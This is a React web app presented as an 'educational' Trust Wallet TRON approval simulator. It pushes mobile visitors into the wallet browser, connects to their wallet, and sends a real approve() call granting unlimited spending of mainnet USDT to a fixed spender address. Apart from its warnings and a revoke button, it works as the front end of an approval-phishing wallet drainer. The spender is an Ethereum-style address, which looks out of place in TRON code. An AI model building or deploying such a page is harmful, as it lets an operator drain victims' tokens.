import React, { useEffect, useState } from "react";

// TRC20 Token Address (USDT on TRON)
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20
const SPENDER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31"; // Test spender address

// TRC20 ABI
const TRC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" }
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  }
];

// Unlimited approval value
const UNLIMITED_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [contract, setContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);
  const [tokenInfo, setTokenInfo] = useState(null);

  /* =========================
     HELPERS
  ========================= */
  const addLog = (msg) => {
    console.log(msg);
    setLogs((prev) => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);
  };

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const hexToDecimal = (hex) => {
    return parseInt(hex, 16);
  };

  /* =========================
     TRUST WALLET DETECTION
  ========================= */
  useEffect(() => {
    const checkTronWeb = async () => {
      // Check for TronWeb injection (Trust Wallet)
      if (window.tronWeb && window.tronWeb.ready) {
        setIsTrustWallet(true);
        setTronWeb(window.tronWeb);
        addLog("✅ Trust Wallet (TRON) detected");
        
        // Check if already connected
        if (window.tronWeb.defaultAddress.base58) {
          await handleAutoConnect();
        }
      } else {
        addLog("⚠️ Trust Wallet not detected or not ready");
        
        // Mobile detection and deep linking
        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
        if (isMobile) {
          addLog("📱 Mobile device detected - redirecting to Trust Wallet...");
          const url = encodeURIComponent(window.location.href);
          // TRON coin_id = 195
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
        } else {
          addLog("💻 Please install Trust Wallet for TRON");
        }
      }
    };

    checkTronWeb();

    // Listen for TronWeb injection
    const checkInterval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready && !tronWeb) {
        checkTronWeb();
      }
    }, 1000);

    return () => clearInterval(checkInterval);
  }, []);

  /* =========================
     AUTO CONNECT
  ========================= */
  const handleAutoConnect = async () => {
    try {
      const address = window.tronWeb.defaultAddress.base58;
      if (!address) return;

      const trxBalance = await window.tronWeb.trx.getBalance(address);
      const trxBalanceFormatted = trxBalance / 1000000; // SUN to TRX

      // Get token info
      const tokenContract = await window.tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
      
      let tokenName = "TRC20 Token";
      let tokenSymbol = "TRC20";
      
      try {
        tokenName = await tokenContract.name().call();
        tokenSymbol = await tokenContract.symbol().call();
      } catch (err) {
        console.log("Could not fetch token details:", err);
      }

      setWallet({
        address: address,
        short: address.slice(0, 8) + "..." + address.slice(-6),
        trx: trxBalanceFormatted.toFixed(6),
        hexAddress: window.tronWeb.address.toHex(address)
      });

      setContract(tokenContract);
      setTokenInfo({ name: tokenName, symbol: tokenSymbol });
      
      addLog(`✅ Auto-connected: ${address.slice(0, 12)}...`);
      addLog(`💰 TRX Balance: ${trxBalanceFormatted.toFixed(4)} TRX`);
      setStep(2);
    } catch (err) {
      console.error("Auto-connect error:", err);
    }
  };

  /* =========================
     CONNECT WALLET
  ========================= */
  const connectWallet = async () => {
    if (connecting) return;

    try {
      setConnecting(true);
      addLog("🔄 Connecting to Trust Wallet...");

      if (!window.tronWeb) {
        throw new Error("Trust Wallet not detected. Please install Trust Wallet.");
      }

      if (!window.tronWeb.ready) {
        throw new Error("Trust Wallet is not ready. Please unlock your wallet.");
      }

      // Request account access
      const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
      
      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts returned");
      }

      const address = window.tronWeb.defaultAddress.base58;
      const trxBalance = await window.tronWeb.trx.getBalance(address);
      const trxBalanceFormatted = trxBalance / 1000000; // SUN to TRX

      // Initialize contract
      const tokenContract = await window.tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
      
      // Fetch token details
      let tokenName = "TRC20 Token";
      let tokenSymbol = "TRC20";
      
      try {
        tokenName = await tokenContract.name().call();
        tokenSymbol = await tokenContract.symbol().call();
      } catch (err) {
        console.log("Token details fetch error:", err);
      }

      setWallet({
        address: address,
        short: address.slice(0, 8) + "..." + address.slice(-6),
        trx: trxBalanceFormatted.toFixed(6),
        hexAddress: window.tronWeb.address.toHex(address)
      });

      setTronWeb(window.tronWeb);
      setContract(tokenContract);
      setTokenInfo({ name: tokenName, symbol: tokenSymbol });

      addLog(`✅ Connected: ${address}`);
      addLog(`💰 TRX Balance: ${trxBalanceFormatted.toFixed(4)} TRX`);
      addLog(`🪙 Token: ${tokenName} (${tokenSymbol})`);
      setStep(2);
    } catch (err) {
      console.error("Connection error:", err);
      
      if (err.code === 4001 || err.message.includes("denied")) {
        addLog("❌ User rejected connection");
      } else if (err.message.includes("not ready")) {
        addLog("❌ Please unlock Trust Wallet first");
      } else {
        addLog(`❌ Connection failed: ${err.message}`);
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     CHECK TOKEN BALANCE
  ========================= */
  const checkTokenBalance = async () => {
    try {
      if (!contract || !wallet) {
        addLog("❌ Wallet not connected");
        return 0;
      }

      const hexAddress = tronWeb.address.toHex(wallet.address);
      const balance = await contract.balanceOf(hexAddress).call();
      const decimals = await contract.decimals().call();
      
      const formattedBalance = balance.toString() / (10 ** decimals);
      return formattedBalance;
    } catch (err) {
      console.error("Balance check error:", err);
      addLog("❌ Failed to check token balance");
      return 0;
    }
  };

  /* =========================
     CHECK ALLOWANCE
  ========================= */
  const checkAllowance = async () => {
    try {
      if (!contract || !wallet) {
        return 0;
      }

      const hexAddress = tronWeb.address.toHex(wallet.address);
      const hexSpender = tronWeb.address.toHex(SPENDER_ADDRESS);
      const allowance = await contract.allowance(hexAddress, hexSpender).call();
      const decimals = await contract.decimals().call();
      
      return allowance.toString() / (10 ** decimals);
    } catch (err) {
      console.error("Allowance check error:", err);
      return 0;
    }
  };

  /* =========================
     SIMULATION - APPROVE TRANSACTION
  ========================= */
  const simulate = async () => {
    try {
      setLoading(true);
      addLog("🔍 Starting simulation...");

      if (!wallet || !tronWeb || !contract) {
        addLog("❌ Wallet not connected");
        return;
      }

      // Check token balance
      addLog("📊 Checking token balance...");
      const balance = await checkTokenBalance();
      addLog(`💰 Token Balance: ${balance.toFixed(6)} ${tokenInfo?.symbol || "tokens"}`);
      await sleep(1000);

      // Check existing allowance
      addLog("🔍 Checking existing allowance...");
      const existingAllowance = await checkAllowance();
      if (existingAllowance > 0) {
        addLog(`⚠️ Existing allowance: ${existingAllowance.toFixed(6)} ${tokenInfo?.symbol || "tokens"}`);
      } else {
        addLog("✅ No existing allowance found");
      }
      await sleep(1000);

      // Security warning
      const confirm = window.confirm(
        `🚨 EXTREME SECURITY WARNING 🚨\n\n` +
        `You are about to approve UNLIMITED spending of:\n` +
        `Token: ${tokenInfo?.name || "TRC20 Token"} (${tokenInfo?.symbol || "TRC20"})\n` +
        `Spender: ${SPENDER_ADDRESS}\n\n` +
        `⚠️ This spender will be able to transfer ALL your ${tokenInfo?.symbol || "tokens"}!\n` +
        `⚠️ This is for EDUCATIONAL purposes only!\n` +
        `⚠️ Use only on test networks!\n\n` +
        `Do you understand the risks and want to continue?`
      );

      if (!confirm) {
        addLog("❌ User cancelled the approval");
        return;
      }

      // Execute approve transaction
      addLog("⏳ Preparing approval transaction...");
      
      const hexSpender = tronWeb.address.toHex(SPENDER_ADDRESS);
      
      addLog(`📝 Spender (hex): ${hexSpender}`);
      addLog(`📝 Approval amount: UNLIMITED`);

      // Send transaction
      const tx = await contract.approve(
        hexSpender,
        UNLIMITED_APPROVAL
      ).send({
        feeLimit: 150000000, // 150 TRX fee limit
        callValue: 0,
        shouldPollResponse: false
      });

      addLog(`✅ Transaction sent: ${tx}`);
      addLog("⏳ Waiting for confirmation...");

      // Poll for transaction confirmation
      let confirmed = false;
      let attempts = 0;
      const maxAttempts = 30; // 60 seconds max wait

      while (!confirmed && attempts < maxAttempts) {
        try {
          const txInfo = await tronWeb.trx.getTransactionInfo(tx);
          if (txInfo && txInfo.id) {
            confirmed = true;
            if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
              addLog("✅ Transaction confirmed successfully!");
              addLog(`📈 Energy used: ${txInfo.receipt.energy_usage || 'N/A'}`);
              addLog(`📈 Bandwidth used: ${txInfo.receipt.net_usage || 'N/A'}`);
            } else {
              addLog("⚠️ Transaction completed but may have failed");
            }
            break;
          }
        } catch (err) {
          // Transaction info not available yet
        }
        
        await sleep(2000);
        attempts++;
        addLog(`⏳ Still waiting... (${attempts * 2}s)`);
      }

      if (confirmed) {
        addLog("🎉 APPROVAL COMPLETE!");
        addLog("🚨 UNLIMITED TRC20 APPROVAL GRANTED!");
        addLog("⚠️ In real scenario, attacker could drain ALL tokens!");
        setStep(3);
      } else {
        addLog("⚠️ Transaction timeout - check wallet for status");
      }

    } catch (err) {
      console.error("Simulation error:", err);
      
      if (err.message && err.message.includes("denied transaction")) {
        addLog("❌ User rejected the transaction");
      } else if (err.message && err.message.includes("insufficient energy")) {
        addLog("❌ Insufficient energy. Need to freeze TRX for energy or use bandwidth.");
      } else if (err.message && err.message.includes("bandwidth")) {
        addLog("❌ Insufficient bandwidth. Need to freeze TRX.");
      } else if (err.message && err.message.includes("revert")) {
        addLog("❌ Transaction reverted. Contract may not accept unlimited approval.");
      } else {
        addLog(`❌ Transaction failed: ${err.message || "Unknown error"}`);
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     REVOKE APPROVAL
  ========================= */
  const revokeApproval = async () => {
    try {
      setLoading(true);
      addLog("🔄 Attempting to revoke approval...");

      if (!contract || !wallet) {
        addLog("❌ Wallet not connected");
        return;
      }

      const hexSpender = tronWeb.address.toHex(SPENDER_ADDRESS);
      
      const tx = await contract.approve(
        hexSpender,
        0
      ).send({
        feeLimit: 100000000,
        callValue: 0
      });

      addLog(`✅ Revoke transaction sent: ${tx}`);
      addLog("⏳ Waiting for confirmation...");

      // Wait a bit and check
      await sleep(5000);
      
      const newAllowance = await checkAllowance();
      if (newAllowance === 0) {
        addLog("✅ Approval successfully revoked!");
      } else {
        addLog("⚠️ Revoke may still be processing");
      }
    } catch (err) {
      console.error("Revoke error:", err);
      addLog(`❌ Revoke failed: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     RESET DEMO
  ========================= */
  const resetDemo = () => {
    setLogs([]);
    setStep(1);
    addLog("🔄 Demo reset");
  };

  /* =========================
     UI
  ========================= */
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white flex items-center justify-center p-4">
      <div className="max-w-2xl w-full bg-gray-800/50 backdrop-blur-lg rounded-2xl p-6 border border-gray-700 shadow-2xl">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-bold bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
            🔐 Trust Wallet - TRON Approval Simulator
          </h1>
          <p className="text-gray-400 mt-2">Educational Demo - TRC20 Token Approval</p>
          
          <div className="mt-3 inline-flex items-center gap-2 bg-blue-900/30 px-3 py-1 rounded-full text-sm">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span>TRON Network</span>
          </div>
        </div>

        {/* Security Warning */}
        <div className="bg-red-900/20 border border-red-700/50 rounded-xl p-4 mb-6">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-xl">🚨</span>
            <h3 className="font-bold text-red-300">SECURITY WARNING</h3>
          </div>
          <ul className="text-sm text-gray-300 space-y-1 list-disc pl-5">
            <li>This is for <strong>EDUCATIONAL PURPOSES ONLY</strong></li>
            <li>Never approve unlimited spending to unknown addresses</li>
            <li>Real attackers can drain ALL your tokens</li>
            <li>Use only with test accounts</li>
          </ul>
        </div>

        {/* Logs Container */}
        {logs.length > 0 && (
          <div className="bg-black/50 border border-gray-700 rounded-xl p-4 mb-6 max-h-80 overflow-y-auto">
            <div className="flex justify-between items-center mb-2">
              <h3 className="font-bold text-gray-300">Activity Log</h3>
              <button 
                onClick={() => setLogs([])} 
                className="text-xs bg-gray-700 px-2 py-1 rounded hover:bg-gray-600"
              >
                Clear
              </button>
            </div>
            <div className="space-y-2 text-sm font-mono">
              {logs.slice().reverse().map((log, index) => (
                <div 
                  key={index} 
                  className={`p-2 rounded ${log.includes('❌') ? 'bg-red-900/20' : log.includes('✅') ? 'bg-green-900/20' : log.includes('⚠️') ? 'bg-yellow-900/20' : 'bg-gray-900/20'}`}
                >
                  {log}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Wallet Status */}
        {wallet && (
          <div className="bg-gradient-to-r from-gray-900 to-gray-800 border border-gray-700 rounded-xl p-4 mb-6">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                <h3 className="font-bold">Wallet Connected</h3>
              </div>
              <span className="text-xs bg-green-900/30 px-2 py-1 rounded">TRON</span>
            </div>
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-gray-400">Address</p>
                <p className="truncate font-mono">{wallet.short}</p>
              </div>
              <div>
                <p className="text-gray-400">TRX Balance</p>
                <p>{wallet.trx} TRX</p>
              </div>
              {tokenInfo && (
                <>
                  <div>
                    <p className="text-gray-400">Token</p>
                    <p>{tokenInfo.name}</p>
                  </div>
                  <div>
                    <p className="text-gray-400">Symbol</p>
                    <p>{tokenInfo.symbol}</p>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {/* Step 1: Connect Wallet */}
        {step === 1 && (
          <div className="space-y-4">
            <div className="text-center">
              <div className="text-6xl mb-4">🔐</div>
              <h2 className="text-xl font-bold mb-2">Connect Trust Wallet</h2>
              <p className="text-gray-400 mb-6">Open this site in Trust Wallet Browser to continue</p>
            </div>
            
            <button
              onClick={connectWallet}
              disabled={connecting || !isTrustWallet}
              className={`w-full py-4 rounded-xl font-bold transition-all duration-300 ${connecting || !isTrustWallet ? 'bg-gray-700 cursor-not-allowed' : 'bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 hover:scale-[1.02]'}`}
            >
              {connecting ? (
                <span className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  Connecting...
                </span>
              ) : !isTrustWallet ? (
                "Install Trust Wallet First"
              ) : (
                "Connect Trust Wallet"
              )}
            </button>
            
            {!isTrustWallet && (
              <div className="text-center">
                <a 
                  href="https://trustwallet.com/download" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-blue-400 hover:text-blue-300 text-sm"
                >
                  Download Trust Wallet
                </a>
              </div>
            )}
          </div>
        )}

        {/* Step 2: Simulation */}
        {step === 2 && wallet && (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="text-5xl mb-2">⚠️</div>
              <h2 className="text-xl font-bold">Start Simulation</h2>
              <p className="text-gray-400">Educational demo of unlimited approval</p>
            </div>

            <button
              onClick={simulate}
              disabled={loading}
              className={`w-full py-4 rounded-xl font-bold text-lg transition-all duration-300 ${loading ? 'bg-gray-700 cursor-not-allowed' : 'bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 hover:scale-[1.02]'}`}
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  Processing...
                </span>
              ) : (
                "🚨 Start Unlimited Approval Simulation"
              )}
            </button>

            <button
              onClick={revokeApproval}
              disabled={loading}
              className="w-full py-3 bg-gradient-to-r from-green-700 to-emerald-700 rounded-xl font-bold hover:from-green-800 hover:to-emerald-800 transition-all duration-300"
            >
              🔒 Revoke Existing Approval (Safe)
            </button>
          </div>
        )}

        {/* Step 3: Results */}
        {step === 3 && (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="text-6xl mb-2">🎓</div>
              <h2 className="text-2xl font-bold text-green-400">Lesson Complete!</h2>
              <p className="text-gray-400 mt-2">You've learned how unlimited approvals work</p>
            </div>

            <div className="bg-gradient-to-r from-red-900/30 to-orange-900/30 border border-red-700/50 rounded-xl p-4">
              <h3 className="font-bold text-lg mb-2">📚 Key Takeaways:</h3>
              <ul className="space-y-2 text-sm">
                <li className="flex items-start gap-2">
                  <span>🔐</span>
                  <span>Always check the spender address</span>
                </li>
                <li className="flex items-start gap-2">
                  <span>💰</span>
                  <span>Set reasonable spending limits, not unlimited</span>
                </li>
                <li className="flex items-start gap-2">
                  <span>⏰</span>
                  <span>Revoke unused approvals regularly</span>
                </li>
                <li className="flex items-start gap-2">
                  <span>🔍</span>
                  <span>Use tools like Tronscan to monitor approvals</span>
                </li>
              </ul>
            </div>

            <div className="flex gap-3">
              <button
                onClick={revokeApproval}
                className="flex-1 py-3 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-bold hover:from-green-700 hover:to-emerald-700 transition-all"
              >
                🔒 Revoke Approval
              </button>
              <button
                onClick={resetDemo}
                className="flex-1 py-3 bg-gradient-to-r from-gray-700 to-gray-800 rounded-xl font-bold hover:from-gray-800 hover:to-gray-900 transition-all"
              >
                🔄 Restart Demo
              </button>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 pt-6 border-t border-gray-700/50 text-center text-xs text-gray-500">
          <p>⚠️ This is an educational tool. Use responsibly on test networks only.</p>
          <p className="mt-1">
            Token Contract: <span className="font-mono">{TRC20_TOKEN_ADDRESS.slice(0, 12)}...</span>
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;